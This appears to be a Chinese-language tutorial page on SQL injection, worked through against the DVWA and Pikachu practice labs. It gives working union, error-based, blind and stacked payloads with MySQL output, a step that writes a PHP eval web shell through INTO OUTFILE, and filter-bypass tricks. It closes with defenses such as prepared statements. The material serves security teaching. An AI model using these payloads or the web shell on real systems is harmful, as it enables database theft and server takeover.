---
slug: /net-security/06/01
---

**SQL 注入漏洞**：没有对输入做一个校验和过滤，使得输入变为 SQL 语句并执行。

SQL 注入条件：

1. 参数对用户来说可控
2. 参数最终会作为数据库查询语句之一



## 类型

### 数字型

输入的参数为整型时，若存在注入漏洞，称为**数字型注入**漏洞。测试步骤：

1️⃣ 加单引号，对应 URL：`www.test.com/test.php?id=1’`

对应的 SQL 语句：`select * from table where id=1’;` 查询出错，则可能存在漏洞。

2️⃣ 加 `and 1 = 1`，对应 URL：`www.test.com/test.php?id=1 and 1 = 1;`

对应的 SQL 语句：`select * from table where id = 1 and 1 = 1;`。 查询正常，则增加存在漏洞可能性。

3️⃣ 加 `and 1 = 2`，对应 URL：`www.test.com/test.php?id = 1 and 1 = 2;`

对应的 SQL 语句：`select * from table where id = 1 and 1 = 2;` 查询失败，则确定漏洞存在。 



### 字符型

输入参数为字符串时，若存在注入漏洞，成为**字符型注入**漏洞。测试步骤：

尝试输入 `1' or 1 = 1#`

对应的 SQL 语句：`select * from table where id='1' or 1 = 1 #'`，如果查询得到所有数据，则确定漏洞存在。

---

在 DVWA 靶场环境中，可以在 SQL Injection 练习：

![](http://img.wukaipeng.com/2023/0922-080220-image-20230922080219805.png)

## 注入方式

### Union 注入

`union` 可以联合查询多个表：

```sql
mysql> select first_name, last_name from users where user_id = 1 union all select first_name, last_name from users where user_id = 2;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Gordon     | Brown     |
+------------+-----------+
2 rows in set (0.00 sec)
```

`union` 查询的表的列数要一致。

注入的时候可以用  `order by 2` 去知道后端查询语句有多少列：`1' order by  2#`

`order by <number>` 这里是根据查询结果中的某列进行排序，如果 `number` 大于查询出来的列出，那么会报错：

```sql
# 根据结果第一列进行排序 ✅
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 1 #'
    -> ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Bob        | Smith     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
+------------+-----------+
5 rows in set (0.00 sec)

# 根据结果第二列进行排序，正常 ✅
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 2 #'
    -> ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
| Bob        | Smith     |
+------------+-----------+
5 rows in set (0.00 sec)

# 根据结果第三列进行排序，报错 ❌
mysql> select first_name, last_name from users where user_id = '1' or 1 = 1 order by 3 #'
    -> ;
ERROR 1054 (42S22): Unknown column '3' in 'order clause'
```

构造 `union` 语句获取数据库名称和版本：`1' union select database(), version() ;#`

![](http://img.wukaipeng.com/2023/0922-085205-image-20230922085204940.png)

🌟 数据库  `information_schema` 

三个重要的表：

1. `SCHEMATA`： 包含所有数据库的名字
2. `TABLES`：包含所有数据库的所有表，默认字段为 `table_name`
3. `COLUMNS`：包含所有数据的所有表的所有字段

三个重要的列

1. `TABLE_SCHEMA：数据库名`
2. `TABLE_NAME`：表名
3. `COLUMN_NAME`：字段名

---

联合注入的过程：

1️⃣ 判断列数、显示位

2️⃣ 获取目标数据库名

3️⃣ 获取目标数据库的所有表名、字段名、字段中的数据

---

获取目标数据库名

```sql
# 注入 SQL：
1' union select 1, group_concat(table_name) from information_schema.tables where table_schema='dvwa'; #
```
```sql
# 底层 MySQL 执行结果
mysql> select first_name, last_name from users where user_id='1' union select 1, group_concat(table_name) from information_schema.tables where table_schema='dvwa';
+------------+---------------------------+
| first_name | last_name                 |
+------------+---------------------------+
| admin      | admin                     |
| 1          | guestbook,k_account,users |
+------------+---------------------------+
2 rows in set (0.02 sec)
```

> `GROUP_CONCAT()`   函数将组中的字符串连接成为单个字符串。

获取字段名

```sql
# 注入 SQL
1' union select 1, group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'; #
```
```sql
# 底层 MySQL 执行结果
mysql> select first_name, last_name from users where user_id='1' union select 1, group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users';
+------------+---------------------------------------------------------------------------+
| first_name | last_name                                                                 |
+------------+---------------------------------------------------------------------------+
| admin      | admin                                                                     |
| 1          | user_id,first_name,last_name,user,password,avatar,last_login,failed_login |
+------------+---------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

获取值

```sql
# 注入 SQL
1' union select user, password from users; #
```

```sql
# 底层 MySQL 执行结果
mysql> select first_name, last_name from users where user_id='1' union select user, password from users;
+------------+----------------------------------+
| first_name | last_name                        |
+------------+----------------------------------+
| admin      | admin                            |
| admin      | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb    | e99a18c428cb38d5f260853678922e03 |
| 1337       | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo      | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy     | 5f4dcc3b5aa765d61d8327deb882cf99 |
+------------+----------------------------------+
6 rows in set (0.00 sec)
```



### 报错注入

利用数据库报错判断是有存在注入点

常用的特殊字符：`\`, `;`, `%00`, `)`, `(`, `#`, `'`, `"` 

这两个函数常用于报错注入：

- `extractvalue()`：用于从 XML 中获取指定的值
- `updatexml()`

---

函数 `extractvalue(xml_frag, xpath_expr)`：

1. `xml_frag`: 这是要处理的 XML 数据的字符串。
2. `xpath_expr`: 这是一个 XPath 表达式，用于指定你想从 XML 数据中提取的值的位置。

下面是一个使用 `EXTRACTVALUE()` 函数的简单示例：

```sql
SELECT EXTRACTVALUE('<book><title>Learn MySQL</title></book>', '/book/title');
```

在上面的例子中，`EXTRACTVALUE()` 函数从给定的 XML 字符串中提取书的标题，并返回值 "Learn MySQL"。

---

利用函数 `extractvalue(xml_frag, xpath_expr)` 报错获取信息，由于 `xml_frag` 接受任意值，所以主要利用 `xpath_expr` 解析特点来爆破：

1️⃣ 获取数据库名

```sql
mysql>  select first_name, last_name from users where user_Id = 1 and extractvalue(1, concat(0x7e, database(), version()));
ERROR 1105 (HY000): XPATH syntax error: '~dvwa5.5.54-0+deb8u1-log'
```

2️⃣ 获取表名

```sql
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='dvwa')));
ERROR 1105 (HY000): XPATH syntax error: '~guestbook,k_account,users'
```

3️⃣ 获取列名

```sql
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')));
ERROR 1105 (HY000): XPATH syntax error: '~user_id,first_name,last_name,us'

# 🚫 这里的错误返回被截断了，我们改用 limit 条件来单独获取每一个列名

mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1)));
ERROR 1105 (HY000): XPATH syntax error: '~user_id'

mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 1,1)));
ERROR 1105 (HY000): XPATH syntax error: '~first_name'

……

# 🚫 另外一种方式是使用 substring 去继续获取剩余的字符串
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select substring(group_concat(column_name), 30) from information_schema.columns where table_schema='dvwa' and table_name='users')));
ERROR 1105 (HY000): XPATH syntax error: '~user,password,avatar,last_login'
```

4️⃣ 获取账号密码

```sql
# 获取账号
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select user_id from dvwa.users limit 0,1)));
ERROR 1105 (HY000): XPATH syntax error: '~1'

# 获取密码
mysql> select first_name, last_name from users where user_id = 1 and extractvalue(1, concat(0x7e, (select password from dvwa.users where user_id = 1 limit 0,1)));
ERROR 1105 (HY000): XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
```



### 盲注

#### 布尔盲注

返回信息只有 true 或者 false，没有其他信息，比如：

![](http://img.wukaipeng.com/2023/1007-083346-image-20231007083346432.png)

![](http://img.wukaipeng.com/2023/1007-083414-image-20231007083414517.png)

存在返回 `User ID exists in the database.`，不存在返回 `User ID is MISSING from the database.`

1️⃣ 判断是否存在注入漏洞。

可以通过下列语句判断是否存在注入漏洞：

|      | 语句          | 结果    |
| ---- | -------------- | ------- |
| 1    | `1`              | exists  |
| 2    | `'`            | MISSING |
| 3    | `1 and 1 = 1 #`  | exists  |
| 4    | `1 and 1 = 2 #`  | exists  |
| 5    | `1’ and 1 = 1 #` | exists  |
| 6    | `1’ and 1 = 2 #` | MISSING |



最后 5、6 步骤成立则说明存在字符串注入。

2️⃣ 推断数据库名称

首先利用 `length()` 推断数据库长度

```sql
1' and length(database()) > 10 #
 ❌ MISSING

1' and length(database()) > 5 # 
 ❌ MISSING

1' and length(database()) > 3 #
 ✅ exists

1' and length(database()) = 4 #
 ✅ exists
```

接着利用 `substr()` 和 `ascii()`，逐一推断数据库的字符组成

```sql
1' and ascii(substr(database(), 1, 1)) > 88 # 
 ✅ exists

1' and ascii(substr(database(), 1, 1)) > 98 # 
 ✅ exists

1' and ascii(substr(database(), 1, 1)) > 100 # 
 ❌ MISSING

1' and ascii(substr(database(), 1, 1)) = 100 # 
 ✅ exists
```

通过上述操作，推断出数据库名称为 `dvwa`。

3️⃣ 推断表名

3️⃣➡️1️⃣ 首先推断表的个数

```sql
1' and (select count(table_name) from information_schema.tables where table_schema=database()) > 10; #
 ❌ MISSING

1' and (select count(table_name) from information_schema.tables where table_schema=database()) > 5; #
 ❌ MISSING

1' and (select count(table_name) from information_schema.tables where table_schema=database()) > 2; #
 ❌ MISSING

1' and (select count(table_name) from information_schema.tables where table_schema=database()) = 2; # 
 ✅ exists
```

`dvwa` 数据库表的个数为 `2`

3️⃣➡️2️⃣ 接着推断第一张表的名称长度

```sql
1' and length((select table_name from information_schema.tables where 
table_schema=database() limit 0,1))>10;#
 ❌ MISSING

1' and length((select table_name from information_schema.tables where 
table_schema=database() limit 0,1))>5;#
 ❌ MISSING

1' and length((select table_name from information_schema.tables where 
table_schema=database() limit 0,1))>8;#
 ❌ MISSING
 
1' and length((select table_name from information_schema.tables where 
table_schema=database() limit 0,1))=9;#
 ✅ exists

## 也可以写成：
1' and length(substr((select table_name from information_schema.tables where 
table_schema=database() limit 0,1),1))=9;#
 ✅ exists
```

 第一张表名长度为 `9`

3️⃣➡️3️⃣ 依次推断第一张表的名称的 9 个字符

```sql
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>88;#
 ✅ exists

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>105;#
 ❌ MISSING

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>96;#
 ✅ exists

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>101;#
 ✅ exists

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103;#
 ❌ MISSING

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=102;#
 ❌ MISSING

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103;#
 ✅ exists
```

可得第一张表的第一个字符 ASCII 码为 103，对应字符为 `g`

依次推断，第一张表的名称为 `guestbook`

同理，得到第二张表的名称为 `users`

4️⃣ 推断表中的字段名

4️⃣➡️1️⃣ 推断 users 表的字段个数

```sql
1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')>10;#
 ❌ MISSING

1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')>5;#
 ✅ exists

1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')>8;#
 ❌ MISSING

1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=8;#
 ✅ exists
```

4️⃣➡️2️⃣ 推断 users 表中的字段名

字段名比较多的情况下，再一个一个推断比较费劲，可以使用字典的方式，比如我们要获取用户名和密码的话，可用字典：

- 用户名：username/user_name/uname/u_name/user/name/... 
- 密码：password/pass_word/pwd/pass/...

```sql
1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='username')=1;#
 ❌ MISSING

1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='user_name')=1;#
 ❌ MISSING

1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='uname')=1;#   
 ❌ MISSING

1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='u_name')=1;#
 ❌ MISSING

1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='user')=1;#
 ✅ exists
```

`users` 表中存在字段 `user`

```sql
1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='password')=1;#   
 ✅ exists
```

`users` 表中存在字段 `password`

5️⃣ 获取表中的字段值

5️⃣➡️1️⃣ `user` 的字段值

```sql
1' and length((select user from users limit 0,1))>10;#
 ❌ MISSING

1' and length((select user from users limit 0,1))>5;#
 ❌ MISSING

1' and length((select user from users limit 0,1))>3;#
 ✅ exists

1' and length((select user from users limit 0,1))=4;#
 ❌ MISSING
 
1' and length((select user from users limit 0,1))=5;#
 ✅ exists
```

先判断字段值的长度为 5，然后再用 ASCII 码方式破解

5️⃣➡️2️⃣ `password` 的字段值

```sql
1' and length(substr((select password from users limit 0,1),1))>10;#
 ✅ exists

1' and length(substr((select password from users limit 0,1),1))>20;#
 ✅ exists

1' and length(substr((select password from users limit 0,1),1))>40;#
 ❌ MISSING

1' and length(substr((select password from users limit 0,1),1))>30;#
 ✅ exists

1' and length(substr((select password from users limit 0,1),1))>35;#
 ❌ MISSING

1' and length(substr((select password from users limit 0,1),1))>33;#
 ❌ MISSING

1' and length(substr((select password from users limit 0,1),1))=32;#
 ✅ exists
```

先判断字段值的长度为 32，这么长那看来密码是用 md5 加密，再用 ASCII 码方式破解花费的时间需要比较长



#### 时间盲注

界面返回只有返回 true（比如页面提交信息之后，只返回“感谢你的提交”）没有其他信息。

可以通过 `if(condition, true_execution, false_execution) 和 ` `sleep(second)` 函数，通过时间延迟来推断。

```sql
1' and if(ascii(substr(database(),1,1))=100,sleep(5),1);#
```

后续过程同布尔盲注。

### 堆叠查询注入

批量执行 SQL 语句

```sql
mysql> show databases;select user, password from users;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.00 sec)

+---------+----------------------------------+
| user    | password                         |
+---------+----------------------------------+
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+----------------------------------+
5 rows in set (0.00 sec)
```

使用条件：为了防止堆叠注入，一些网站的 API、数据库引擎或者权限会做限制，一次只能执行一条 SQL 语句。比如 PHP 为了防止 SQL 注入，会调用 `mysqi_query()` 函数，只能执行一条语句。

### 二次注入

二次注入指数据库在存入数据时做了校验和处理，但是在取出数据时没有做校验和处理，导致的二次注入。

![](http://img.wukaipeng.com/2023/1010-085957-image-20231010085956378.png)

### 宽字节注入

🧠 概念

- 单字节字符集：所有字符都使用一个字节表示，比如 ASCII 编码
- 多字节字符集：每个字符由一个或多个字节组成，比如 UTF-8, UTF-16

宽字节注入利用 MySQL 的一个特性，当 MySQL 使用 GBK 编码时，会认为两个字符是一个汉字。

🎧 原理

网站为了防止 SQL 注入，会在特殊字符加上反斜线（`\`）转义，宽字节注入主要是将反斜线给无效化。

结合 MySQL 特性，可以用一个特殊的字符和反斜线结合，使之无效化。

反斜线（`\`）编码 👉 `%5c` 

加上 `%df`

`%df%5c` 编码 👉



🔗 [GBK 编码表](https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php#:~:text=GBK%E7%BC%96%E7%A0%81%EF%BC%8C%E6%98%AF%E5%AF%B9GB2312%E7%BC%96%E7%A0%81%E7%9A%84%E6%89%A9%E5%B1%95%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%AE%8C%E5%85%A8%E5%85%BC%E5%AE%B9GB2312-80%E6%A0%87%E5%87%86%E3%80%82,GBK%E7%BC%96%E7%A0%81%E4%BE%9D%E7%84%B6%E9%87%87%E7%94%A8%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BC%96%E7%A0%81%E6%96%B9%E6%A1%88%EF%BC%8C%E5%85%B6%E7%BC%96%E7%A0%81%E8%8C%83%E5%9B%B4%EF%BC%9A8140%EF%BC%8DFEFE%EF%BC%8C%E5%89%94%E9%99%A4xx7F%E7%A0%81%E4%BD%8D%EF%BC%8C%E5%85%B123940%E4%B8%AA%E7%A0%81%E4%BD%8D%E3%80%82%20%E5%85%B1%E6%94%B6%E5%BD%95%E6%B1%89%E5%AD%97%E5%92%8C%E5%9B%BE%E5%BD%A2%E7%AC%A6%E5%8F%B721886%E4%B8%AA%EF%BC%8C%E5%85%B6%E4%B8%AD%E6%B1%89%E5%AD%97%EF%BC%88%E5%8C%85%E6%8B%AC%E9%83%A8%E9%A6%96%E5%92%8C%E6%9E%84%E4%BB%B6%EF%BC%8921003%E4%B8%AA%EF%BC%8C%E5%9B%BE%E5%BD%A2%E7%AC%A6%E5%8F%B7883%E4%B8%AA%E3%80%82)



安装靶场 Pikachu

```bash
docker pull area39/pikachu
docker run -d -p  8081:80 --name="pikachu" area39/pikachu
```

![](http://img.wukaipeng.com/2023/1011-075508-image-20231011075507145.png)

![](http://img.wukaipeng.com/2023/1011-082149-image-20231011082149432.png)

拦截请求，可以看到，已经注入成功，请求返回了所有数据：

![](http://img.wukaipeng.com/2023/1012-075115-image-20231012075115796.png)

后续注入同 Union 注入

![](http://img.wukaipeng.com/2023/1012-080932-image-20231012080932404.png)

### HTTP header 和 Cookie 注入

并不是一种新技术，而是一种特殊的注入位置，在 HTTP header 和 Cookie 上。



## Get Shell

MySQL 支持写文件。条件：

1. 知道网站的绝对路径。可以通过开源程序、报错信息、phpinfo 界面、404 界面等知道
2. MySQL 对目录有写权限
3. 要有 mysql file 权限（即 MySQL 是否可以对系统文件有读写权限）

<br />

执行如下代码：

```sql
' union select 1, "<?php eval($_POST['a']);" into outfile '/var/www/html/inject.php
```

这里 `eval()` 同 Javascript 的 `eval()`，把字符串当做命令执行

`$_POST['a']` 是指获取 HTTP 请求中的 POST 的参数 `a`

![](http://img.wukaipeng.com/2023/1012-085131-image-20231012085131302.png)

我们也可以在靶场后端看到这个文件确实被注入了：

![](http://img.wukaipeng.com/2023/1012-085222-image-20231012085222224.png)

接着使用 HackBar 来请求 POST 并注入参数 `a`：

![](http://img.wukaipeng.com/2023/1012-085943-image-20231012085942942.png)



或者使用蚁剑：

![](http://img.wukaipeng.com/2023/1013-083921-image-20231013083919924.png)

## 注入绕过

### 大小写绕过

利用大小写匹配绕过，最简单的绕过方式

```
z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4
```

### 替换关键字

正则表达式替换掉关键字

```
z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4
```

假设只有一次正则全局匹配，那么 `UNIunionON` 中间 `union` 匹配并被删除掉，结果剩下 `UNION`。



### 使用编码

1. URL 编码

2. 十六进制编码
3. Unicode 编码

### 使用注释

常见的注释符号：`-- `， `/**/`， `#`， `-- -`

1. 普通注释

假设我们注入 `select 1` 这样的语句，会被正则匹配并且删除掉

但是假设我们注入 `select1`，则又会报错。

但我们可以注入 `select/**/1`，那么会成功注入

```sql
mysql> select 1;
+---+
| 1 |
+---+
| 1 |
+---+
1 row in set (0.00 sec)

mysql> select1;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'select1' at line 1

mysql> select/**/1;
+---+
| 1 |
+---+
| 1 |
+---+
1 row in set (0.00 sec)
```

2. 内联注释

内联注释是 MySQL 的一个特性，可以在注释中执行命令，语法为：`/*!COMMAND*/`

```sql
mysql> select 1 /*!union*/ select 2;
+---+
| 1 |
+---+
| 1 |
| 2 |
+---+
2 rows in set (0.00 sec)
```

### 等价函数与命令

使用等价函数或者符号替换。

函数或变量

1. `ascii()` 替换
   1.  `bin()` 二进制
   2. `hex()` 十六进制
2. `sleep()` 替换
   1. `benchmark(count, expr)`  重复计算 expr 表达式 count 次
3. `group_concat()` 替换
   1. `concat_ws()` 多个列的字段合并
4. `substr()` 替换
   1. `substring()`
   2. `mid()` 获取字符串的一部分

符号

1. `and` 🟰 `&&`
2. `or` 🟰 `||`
3. 空格 🟰`%20`， `%09`， `%0a`， `%0b`， `%0c` ，`%0d`， `%a0`， `/**/`



### 特殊符号

1. 反引号，例如

```sql
mysql> select first_name from`users`;
+------------+
| first_name |
+------------+
| admin      |
| Gordon     |
| Hack       |
| Pablo      |
| Bob        |
+------------+
5 rows in set (0.00 sec)
```

2. `-`，`+`，`.` 符号

```sql
mysql> select+user_id-1+1.from users;
+---------------+
| +user_id-1+1. |
+---------------+
|             1 |
|             2 |
|             3 |
|             4 |
|             5 |
+---------------+
5 rows in set (0.01 sec)
```

> 😨 为什么这条语句“select+user_id-1+1.from users;”在 MySQL 中可以执行成功？
>
> 🤖 这条语句在第一眼看上去似乎是不合法的，但实际上，它利用了 MySQL 的某些语法规则和解析方式。让我们逐步分解这条语句：
>
> 1. **`select+user_id-1+1.from users;`** - 在这里，MySQL 会解析 `+` 为算数运算符。所以 `select+user_id` 被解析为选择 `user_id` 列。
> 2. **`-1+1`** - 这是一个简单的算数表达式，它的结果是0。
> 3. **`.from`** - 这是关键的部分。虽然在常规 SQL 语法中，我们不会这样写，但这里的点号 (`.`) 被解析为一个小数点，所以 `1.from` 被解析为 `1.0`。紧跟在后面的 `from` 是正常的 SQL 关键字，用于指定从哪个表中选择数据。
>
> 综上所述，整个语句的意思是从 `users` 表中选择 `user_id` 列，并对每个 `user_id` 值减去 1 然后再加 1，结果仍为 `user_id`。

3. `@` 符号，例如

```sql
mysql> select@^1.from users;
+------+
| @^1. |
+------+
| NULL |
| NULL |
| NULL |
| NULL |
| NULL |
+------+
5 rows in set (0.00 sec)
```

4. MySQL 的 function 可以不用空格：

```sql
mysql> select-count(user_id)test from users;
+------+
| test |
+------+
|   -5 |
+------+
1 row in set (0.00 sec)
```

## 防御

### 预编译

SQL 注入原因还是因为**先拼接字符串，然后再进行语法分析，执行语句**。而通过预编译：

```java
String sql = "select id, num from user where id=?";    //定义SQL语句
      PreparedStatement ps = conn.prepareStatement(sql);
      ps.setInt(1,id);     //设置变量
      ps.executeQuery();    //执行
```

让 SQl 引擎预**先编译好语法，后面填充进来的参数就只是一个值，不会再进行语法分析**，这是防御 SQL 注入最有效的方式。

### 安全函数

无法使用预编译的场景下，可以使用安全函数来校验参数的类型：

```java
MySQLCodec codec = new MySQLCodec(Mode.STANDARD);
name = ESAPI.encoder().encodeForSQL(codec,name);
String sql = "select id,no from user where name=" + name;
```



